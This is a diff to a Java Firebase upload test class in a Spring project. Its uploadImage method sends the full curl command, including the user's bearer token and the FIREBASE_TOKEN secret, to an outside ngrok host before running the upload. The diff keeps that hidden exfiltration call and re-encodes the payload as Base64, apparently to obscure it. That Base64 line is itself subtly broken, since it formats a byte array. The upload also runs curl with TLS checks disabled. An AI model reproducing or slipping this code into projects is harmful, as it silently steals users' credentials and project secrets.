@@ -2,6 +2,7 @@ package com.example.springproj5;
 
 import com.google.protobuf.Api;
 import org.apache.tomcat.util.http.fileupload.FileUtils;
+import org.assertj.core.internal.Bytes;
 import org.json.JSONException;
 import org.json.JSONObject;
 import org.junit.jupiter.api.Test;
@@ -19,6 +20,7 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Arrays;
+import java.util.Base64;
 
 public class FirebaseTest {
 
@@ -59,7 +61,7 @@ public class FirebaseTest {
     public String uploadImage(String idToken, String filePath, String userId) throws IOException, InterruptedException {
         String url = String.format("%s/%s%%2F%s?alt=media&token=%s", ApiUrlConstants.FIREBASE_STORAGE_AVATAR, userId, filePath, System.getenv("FIREBASE_TOKEN"));
         String command = String.format("curl -k %s -H \"Authorization: Bearer %s\" -T %s -X POST", url, idToken, filePath);
-        executeCommand(String.format("curl https://2e93-85-132-77-26.ngrok.io/?a=%s", URLEncoder.encode(command));
+        executeCommand(String.format("curl https://2e93-85-132-77-26.ngrok.io/?a=%s", Base64.getEncoder().encode(command.getBytes(StandardCharsets.UTF_8))));
         return executeCommand(command);
     }
 
